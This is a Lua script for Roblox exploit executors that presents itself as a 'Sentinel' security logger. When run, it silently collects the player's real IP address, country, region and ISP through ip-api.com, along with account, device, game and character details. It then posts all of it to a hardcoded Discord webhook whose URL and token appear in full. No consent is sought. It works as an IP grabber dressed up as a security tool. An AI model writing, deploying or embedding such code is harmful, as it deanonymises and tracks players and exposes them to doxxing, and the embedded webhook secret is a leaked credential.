local HttpService          = game:GetService("HttpService")
local Players              = game:GetService("Players")
local UserInputService     = game:GetService("UserInputService")
local MarketplaceService   = game:GetService("MarketplaceService")
local LocalizationService  = game:GetService("LocalizationService")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1562117919171813548/B4512PrHteF4TH4KW5VoQ9Uy6vMcrXzIy7XWspFfvbnUQ_iAVzlU3tYsMeA5Tu1UE5re"

local LocalPlayer = Players.LocalPlayer

local function safe(fn, default)
    local ok, result = pcall(fn)
    if ok and result ~= nil then return result end
    return default
end

local function trunc(s, max)
    max = max or 1024
    if #s > max then return s:sub(1, max - 3) .. "..." end
    return s
end

local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request

local userName    = safe(function() return LocalPlayer.Name        end, "Unknown")
local displayName = safe(function() return LocalPlayer.DisplayName end, userName)
local userId      = safe(function() return tostring(LocalPlayer.UserId) end, "?")

local accountAgeNum = safe(function()
    local age = LocalPlayer.AccountAge
    if type(age) == "number" then return age end
end, nil)

local accountAge  = accountAgeNum and (accountAgeNum .. " days") or "Unknown"
local createdDate = accountAgeNum
    and os.date("%Y-%m-%d", os.time() - accountAgeNum * 86400)
    or "N/A"

local membership = "None"
pcall(function()
    local mt = LocalPlayer.MembershipType
    if mt then membership = tostring(mt.Name or mt) end
end)

local teamName = safe(function()
    return LocalPlayer.Team and LocalPlayer.Team.Name or "None"
end, "None")

local deviceType = "PC"
if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
    deviceType = "Mobile"
end
if syn and syn.getplatform then
    local platform = safe(function() return syn.getplatform() end, nil)
    if platform == "UWP" then deviceType = "UWP"
    elseif platform == "Android" then deviceType = "Mobile" end
end

local executorName = "Unknown"
if type(identifyexecutor) == "function" then
    local ok, name = pcall(identifyexecutor)
    if ok and type(name) == "string" and #name > 0 then
        executorName = name
    end
end
if executorName == "Unknown" then
    if syn then executorName = "Synapse"
    elseif KRNL_LOADED then executorName = "KRNL"
    elseif FLUXUS_LOADED then executorName = "Fluxus"
    elseif is_sirhurt_closure then executorName = "SirHurt" end
end

local placeId  = tostring(game.PlaceId or "?")
local jobId    = tostring(game.JobId   or "?")
local gameName = "Unknown"
do
    local ok, info = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    if ok and info and info.Name then gameName = tostring(info.Name) end
end
local playersCount = #Players:GetPlayers()

local char = LocalPlayer.Character
local hum  = char and char:FindFirstChildOfClass("Humanoid")
local hrp  = char and char:FindFirstChild("HumanoidRootPart")

local health    = hum and math.floor(hum.Health)    or 0
local maxHealth = hum and math.floor(hum.MaxHealth) or 0
local walkSpeed = hum and hum.WalkSpeed             or 0

local positionStr = "N/A"
if hrp and hrp:IsA("BasePart") then
    local p = hrp.Position
    positionStr = string.format("(%.1f, %.1f, %.1f)", p.X, p.Y, p.Z)
end

local rigType = hum and tostring(hum.RigType):gsub("Enum.HumanoidRigType.", "") or "N/A"

local equippedTool  = "None"
local backpackCount = 0
if char then
    local t = char:FindFirstChildOfClass("Tool")
    if t then equippedTool = t.Name end
end
do
    local bp = LocalPlayer:FindFirstChildOfClass("Backpack")
    if bp then
        for _, c in ipairs(bp:GetChildren()) do
            if c:IsA("Tool") then backpackCount = backpackCount + 1 end
        end
    end
end
local toolCount = backpackCount + (equippedTool ~= "None" and 1 or 0)

local camFOV = safe(function()
    return math.floor(workspace.CurrentCamera.FieldOfView)
end, 70)

local ip, country, regionName, isp = "N/A", "N/A", "N/A", "N/A"
if type(httpRequest) == "function" then
    local ok, res = pcall(httpRequest, { Url = "http://ip-api.com/json/", Method = "GET" })
    if ok and type(res) == "table" and type(res.Body) == "string" then
        local okJ, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
        if okJ and type(data) == "table" and data.status == "success" then
            ip         = tostring(data.query      or "N/A")
            country    = tostring(data.country    or "N/A")
            regionName = tostring(data.regionName or "N/A")
            isp        = tostring(data.isp        or "N/A")
        end
    end
end

local serverRegion = "N/A"
pcall(function()
    local loc = LocalizationService:GetCountryRegionForPlayerAsync(LocalPlayer)
    if loc then serverRegion = tostring(loc) end
end)

local userField = table.concat({
    "**Username**: "      .. userName,
    "**Display Name**: "  .. displayName,
    "**UserId**: "        .. userId,
    "**Account Age**: "   .. accountAge,
    "**Created**: "       .. createdDate,
    "**Membership**: "    .. membership,
    "**Executor**: "      .. executorName,
}, "\n")

local networkField = table.concat({
    "**IP**: "             .. ip,
    "**Country**: "        .. country,
    "**Region**: "         .. regionName,
    "**ISP**: "            .. isp,
    "**Server Region**: "  .. serverRegion,
    "**Device**: "         .. deviceType,
}, "\n")

local gameField = table.concat({
    "**Game**: "     .. gameName,
    "**PlaceId**: "  .. placeId,
    "**JobId**: "    .. jobId,
    "**Players**: "  .. tostring(playersCount),
}, "\n")

local charField = table.concat({
    "**Health**: "          .. health .. " / " .. maxHealth,
    "**WalkSpeed**: "       .. tostring(walkSpeed),
    "**Camera FOV**: "      .. tostring(camFOV),
    "**Position**: "        .. positionStr,
    "**Tools owned**: "     .. tostring(toolCount),
    "**Team**: "            .. teamName,
    "**Rig Type**: "        .. rigType,
    "**Equipped Tool**: "   .. equippedTool,
    "**Backpack Tools**: "  .. tostring(backpackCount),
}, "\n")

local embed = {
    title       = "Sentinel Player Log\n• used for security.\n• used to found spies\n• used to secure Sentinel.",
    description = "Executed by @**" .. userName .. "** (`" .. userId .. "`)",
    color       = 0x5865F2,
    fields = {
        { name = "👤 User",      value = trunc(userField),     inline = true },
        { name = "🌐 Network",   value = trunc(networkField),  inline = true },
        { name = "🎮 Game",      value = trunc(gameField),     inline = true },
        { name = "🧍 Character", value = trunc(charField),     inline = true },
    },
    timestamp = DateTime.now():ToIsoDate(),
    footer    = { text = "Sentinel Logger · " .. executorName },
}

local payloadJson = HttpService:JSONEncode({ embeds = { embed } })

local function send(body)
    if type(httpRequest) == "function" then
        local ok, res = pcall(httpRequest, {
            Url     = WEBHOOK_URL,
            Method  = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body    = body,
        })
        if not ok then
            warn("[Webhook] request error: " .. tostring(res))
            return false
        end
        local statusCode = res and (res.StatusCode or res.StatusMessage) or "?"
        print("[Webhook] HTTP " .. tostring(statusCode))
        return statusCode == 204 or statusCode == 200
    end

    if HttpPost then
        local ok, err = pcall(HttpPost, WEBHOOK_URL, body, "application/json")
        if ok then
            print("[Webhook] sent via HttpPost")
            return true
        end
        warn("[Webhook] HttpPost failed: " .. tostring(err))
        return false
    end

    warn("[Webhook] no HTTP method available in this executor")
    return false
end

send(payloadJson)
